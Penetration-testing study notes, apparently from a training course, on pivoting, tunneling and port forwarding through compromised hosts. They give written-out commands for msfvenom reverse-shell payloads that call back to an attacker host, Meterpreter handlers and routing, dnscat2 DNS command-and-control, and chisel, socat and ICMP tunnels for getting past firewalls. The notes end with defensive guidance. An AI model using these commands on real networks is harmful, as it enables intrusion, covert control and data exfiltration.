## Introduction to Pivoting, Tunneling, and Port Forwarding

Pivoting moves through a compromised host to reach otherwise unreachable network segments. Tunneling encapsulates traffic inside another protocol to move it through a network undetected.

Terms for a compromised host used to pivot: Pivot Host, Proxy, Foothold, Beach Head system, Jump Host.

### Lateral Movement vs Pivoting vs Tunneling

Lateral Movement spreads access across hosts/services in a network, often enabling privilege escalation. Pivoting moves deeper into previously unreachable segments through compromised hosts. Tunneling hides traffic inside another protocol to evade detection, enabling C2 and exfiltration.

## The Networking Behind Pivoting

### IP Addressing & NICs

Check a compromised host's interfaces for multiple NICs (dual-homed = pivot opportunity) with `ifconfig` (Linux/macOS) or `ipconfig` (Windows). Static IPs are common on servers, routers, switches, printers.

### Routing

```bash
netstat -r
ip route
```

A router forwards traffic using its routing table (destination IP). Traffic matching no entry goes to the default gateway (gateway of last resort). Check a host's routing table for reachable networks or routes to add.

### Protocols, Services & Ports

An open port on an IP identifies a reachable application. Connecting on a firewall-permitted port (e.g. 80) can give a foothold through the same path as legitimate traffic. Track source ports so payloads connect back to the intended listener.

## Dynamic Port Forwarding with SSH and SOCKS Tunneling

Port forwarding redirects a connection from one port to another over TCP, often encapsulated in SSH or SOCKS, to bypass firewalls via a compromised host.

### SSH Local Port Forwarding

Forwards a service on the remote host to a local port on the attack host.

```bash
nmap -sT -p22,3306 <TARGET_IP>
ssh -L <PORT>:localhost:3306 <USERNAME>@<TARGET_IP>
ssh -L <PORT>:localhost:3306 -L <PORT_2>:localhost:80 <USERNAME>@<TARGET_IP>
```

```bash
netstat -antp | grep <PORT>
nmap -v -sV -p<PORT> localhost
```

### SSH Dynamic Port Forwarding (SOCKS)

Check the pivot host's interfaces for a second NIC into a new network, then pivot a SOCKS listener through it to scan that network.

SOCKS (Socket Secure) proxies client traffic through a SOCKS server, bypassing firewall restrictions. SOCKS4 has no auth/UDP, SOCKS5 adds both.

```bash
ssh -D <PORT> <USERNAME>@<TARGET_IP>
```

`proxychains` routes another tool's TCP traffic through SOCKS/HTTP(S)/TOR proxies and can chain several, hiding the originating host's IP.

Add to `/etc/proxychains.conf`:

```text
socks4 127.0.0.1 <PORT>
```

```bash
proxychains nmap -v -sn <TARGET_SUBNET>
proxychains nmap -v -Pn -sT <TARGET_IP_2>
```

Proxychains only supports full TCP connect scans (`-sT`/`-Pn`); it can't parse partial packets, so half-open scans return wrong results. Windows Defender blocks ICMP by default, so host-discovery pings may fail.

### Using Metasploit with Proxychains

```bash
proxychains msfconsole
```

```text
msf6 > search rdp_scanner
msf6 > use auxiliary/scanner/rdp/rdp_scanner
msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts <TARGET_IP_2>
msf6 auxiliary(scanner/rdp/rdp_scanner) > run
```

Identifies hosts speaking RDP (3389) through the proxy.

```bash
proxychains xfreerdp /v:<TARGET_IP_2> /u:<USERNAME_2> /p:<PASSWORD_2>
```

## Remote/Reverse Port Forwarding with SSH

Forwards a local service out to a remote port, for when the target can only route back to the pivot's network, not the attack host.

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<PIVOT_IP> -f exe -o <FILE> LPORT=8080
```

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run
```

```bash
scp <FILE> <USERNAME>@<TARGET_IP>:~/
python3 -m http.server 8123
```

```powershell
Invoke-WebRequest -Uri "http://<PIVOT_IP>:8123/<FILE>" -OutFile "C:\<FILE>"
```

```bash
ssh -R <PIVOT_IP>:8080:0.0.0.0:8000 <USERNAME>@<TARGET_IP> -vN
```

`-R` makes the pivot listen on `<PIVOT_IP>:8080` and forward incoming connections to the attack host's `0.0.0.0:8000`. `-vN` adds verbosity and skips the login shell.

## Meterpreter Tunneling & Port Forwarding

Pivot using an existing Meterpreter session instead of SSH forwarding.

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> -f elf -o <FILE> LPORT=8080
```

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```

Copy the payload to the pivot over SCP, `chmod +x`, execute for a session.

### Ping Sweep

```text
meterpreter > run post/multi/gather/ping_sweep RHOSTS=<TARGET_SUBNET>
```

Generates ICMP from the pivot across the target subnet. A sweep can fail on the first attempt while the ARP cache builds — run it twice.

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

### MSF SOCKS Proxy + AutoRoute

If ICMP is blocked, use Metasploit's `socks_proxy` for routing instead of SSH, then TCP scan.

```text
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT <PORT>
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
```

```text
socks4 127.0.0.1 <PORT>
```

Switch to `socks5` in proxychains.conf depending on the SOCKS version running.

```text
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

```text
meterpreter > run autoroute -s <TARGET_SUBNET>
meterpreter > run autoroute -p
```

`autoroute` adds a route to the target subnet through the Meterpreter session so proxychains traffic reaches it.

### Portfwd (Local)

`-l` local port to listen on | `-L` local host (optional) | `-p` remote port to connect | `-r` remote host | `-R` reverse forward | `-i` entry index

```text
meterpreter > portfwd add -l 3300 -p 3389 -r <TARGET_IP_2>
```

Starts a listener on local 3300, forwards to the remote host's 3389 via the session.

### Portfwd (Reverse)

```text
meterpreter > portfwd add -R -l 8081 -p 1234 -L <ATTACKER_IP>
```

Forwards connections the pivot receives on 1234 to the attack host's local 8081.

```text
meterpreter > bg
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > run
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o <FILE> LPORT=1234
```

LHOST is the pivot's internal IP — the payload connects to the pivot on 1234, which forwards to the attack host's 8081 listener.

## Socat Redirection with a Reverse Shell

`socat` relays TCP between two sockets without SSH.

```bash
socat TCP4-LISTEN:8080,fork TCP4:<ATTACKER_IP>:80
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o <FILE> LPORT=8080
```

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
msf6 exploit(multi/handler) > run
```

## Socat Redirection with a Bind Shell

Target binds a listener; socat on the pivot relays the Metasploit bind handler's connection to it.

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o <FILE> LPORT=8443
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST <TARGET_IP>
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
```

## SSH for Windows: plink.exe

Plink (PuTTY Link) is a Windows CLI SSH client bundled with PuTTY. Useful for living off the land on a locked-down host, or when using a Windows attack host.

```cmd
plink -ssh -D <PORT> <USERNAME>@<TARGET_IP>
```

Proxifier can tunnel desktop apps (e.g. `mstsc.exe`) through the SOCKS listener Plink creates, by pointing it at 127.0.0.1:`<PORT>`.

Plink: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html  
Proxifier: https://www.proxifier.com

## SSH Pivoting with Sshuttle

Python tool that automates iptables rules to pivot over SSH only (no TOR/HTTPS support). No proxychains needed afterward.

```bash
sudo apt-get install sshuttle
sudo sshuttle -r <USERNAME>@<TARGET_IP> <TARGET_SUBNET> -v
```

Once running, any tool works directly against the target subnet without proxychains.

## Web Server Pivoting with Rpivot

Rpivot (Python2) is a reverse SOCKS proxy: binds a host inside the network to an external server and exposes the client's local port server-side.

```bash
git clone https://github.com/klsecservices/rpivot.git
python2 server.py --proxy-port <PORT> --server-port <PORT_2> --server-ip 0.0.0.0
```

```bash
scp -r rpivot <USERNAME>@<TARGET_IP>:/home/<USERNAME>/
```

```bash
python2 client.py --server-ip <ATTACKER_IP> --server-port <PORT_2>
```

```bash
proxychains firefox-esr <TARGET_IP_3>:80
```

### NTLM Proxy Auth

For environments with an HTTP proxy using NTLM auth on the DC:

```bash
python client.py --server-ip <URL> --server-port 8080 --ntlm-proxy-ip <PIVOT_IP> --ntlm-proxy-port 8081 --domain <TARGET_DOMAIN> --username <USERNAME> --password <PASSWORD>
```

## Port Forwarding with Windows Netsh

Netsh configures Windows networking: find routes, view firewall config, add proxies, create port forwarding rules.

```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=<TARGET_IP> connectport=3389 connectaddress=<TARGET_IP_2>
netsh.exe interface portproxy show v4tov4
```

Forwards traffic received on the pivot's 8080 to a remote host's 3389. Connect to the pivot's 8080 from the attack host to reach the internal target.

## DNS Tunneling with Dnscat2

Dnscat2 tunnels data between two hosts inside DNS TXT records over an encrypted C2 channel — useful to evade firewalls that strip/inspect HTTPS.

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
sudo ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<TARGET_DOMAIN> --no-cache
```

Server prints a pre-shared secret clients need to authenticate/encrypt.

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACKER_IP> -Domain <TARGET_DOMAIN> -PreSharedSecret <TOKEN> -Exec cmd
```

```text
dnscat2> ?
dnscat2> window -i 1
```

`-PreSharedSecret` must match the server's secret for the session to show ENCRYPTED AND VERIFIED.

## SOCKS5 Tunneling with Chisel

Chisel (Go) tunnels TCP/UDP over HTTP, secured with SSH.

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```

Mismatched glibc versions between target/attack host can break the build — use a prebuilt release binary instead.

```bash
scp chisel <USERNAME>@<TARGET_IP>:~/
```

```bash
./chisel server -v -p 1234 --socks5
```

```bash
./chisel client -v <TARGET_IP>:1234 socks
```

Client listens locally on port 1080.

```text
socks5 127.0.0.1 1080
```

```bash
proxychains xfreerdp /v:<TARGET_IP_2> /u:<USERNAME_2> /p:<PASSWORD_2>
```

### Chisel Reverse Pivot

For firewalls restricting inbound to the compromised target, run the server on the attack host with `--reverse`; the client on the pivot connects out.

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

```bash
./chisel client -v <ATTACKER_IP>:1234 R:socks
```

`R:` reverses the remote; `R:socks` makes the server listen on its default SOCKS port (1080), terminating the connection at the client's internal SOCKS5 proxy.

## ICMP Tunneling with SOCKS

Encapsulates traffic inside ICMP echo request/response. Works only where outbound ping is permitted — useful for exfil and tunneling past restrictive firewalls.

```bash
git clone https://github.com/utoni/ptunnel-ng.git
sudo ./autogen.sh
```

Static binary build:

```bash
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

```bash
scp -r ptunnel-ng <USERNAME>@<TARGET_IP>:~/
```

```bash
sudo ./ptunnel-ng -r<TARGET_IP> -R22
```

```bash
sudo ./ptunnel-ng -p<TARGET_IP> -l2222 -r<TARGET_IP> -R22
```

`-r` is the jump-box IP ptunnel-ng accepts connections on (server side). `-p` is the ptunnel-ng server to connect to, `-l` the local port for tunneled traffic (client side).

```bash
ssh -p2222 -l<USERNAME> 127.0.0.1
```

```bash
ssh -D <PORT> -p2222 -l<USERNAME> 127.0.0.1
```

```bash
proxychains nmap -sV -sT <TARGET_IP_2> -p3389
```

Keep GLIBC versions in parity between target and attack host or ptunnel-ng errors.

## RDP and SOCKS Tunneling with SocksOverRDP

Uses RDP's Dynamic Virtual Channels (normally clipboard/audio) to tunnel arbitrary packets over an RDP session — Windows-only pivoting without SSH. Pair with Proxifier as the proxy client.

```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
```

Connect via `mstsc.exe` — the plugin prompts and listens on 127.0.0.1:1080. Transfer and run `SocksOverRDP-Server.exe` (admin) on the next-hop target.

```cmd
netstat -antb | findstr 1080
```

Configure Proxifier to forward to 127.0.0.1:1080, then run `mstsc.exe` through Proxifier to reach the final target via the chain.

If RDP performance is poor across multiple sessions, set `Experience` > `Performance` to `Modem` in mstsc.exe.

SocksOverRDP releases: https://github.com/nccgroup/SocksOverRDP/releases  
Proxifier: https://www.proxifier.com/download/#win-tab

## Detection & Prevention

### Setting a Baseline

Document and track: DNS records, network device backups, DHCP configs, full application inventory, all enterprise hosts and locations, users with elevated permissions, dual-homed hosts, a current visual network diagram.

### People, Processes, and Technology

Network hardening splits into People, Process, Technology.

#### People

Enforce MFA for authentication, especially admin accounts, to limit damage from a compromised password/hash. BYOD increases risk since the org has limited control over personal devices connecting to internal resources.

#### Processes

Asset monitoring/management policy, access control (provisioning/de-provisioning), host provisioning/decommissioning baselines (gold images), change management documentation.

#### Technology

Periodically check for legacy misconfigurations and emerging threats; patch or accept risk per the CIA triad trade-off.

### From the Outside Moving In

#### Perimeter First

External firewall interface: block suspicious connections by IP, ensure only approved users connect to VPNs, allow quick disconnect of suspicious connections without disrupting business.

#### Internal Considerations

Harden and DMZ any internet-exposed hosts. Use IDS/IPS. Segment networks by team. Separate production and management networks. Track remote access to admin/management networks. Correlate infra and endpoint logs. Use host-based IDS/IPS and event logs.

A SIEM correlating host/infra logs plus solid segmentation makes it far harder for an attacker to gain a foothold and pivot.

### MITRE Breakdown

`T1133` External Remote Services — firewall segmentation, block internal protocols from reaching out, require VPN/logical presence before granting access.

`T1021` Remote Services — MFA on SSH/RDP, restrict which accounts/hosts can use remote access, firewall-limit remote service ports, expose infra remote management only to an OOB network.

`T1571` Non-Standard Ports — baseline normal ports/protocols to spot mismatched pairings (e.g. HTTPS on a non-standard port).

`T1572` Protocol Tunneling — restrict allowed ports/protocols in/out, block DNS resolution from hosts other than the DNS server, watch for beaconing patterns even in encrypted traffic.

`T1090` Proxy Use — maintain an allow/block list of domains and IPs; detection needs intimate knowledge of normal net flow.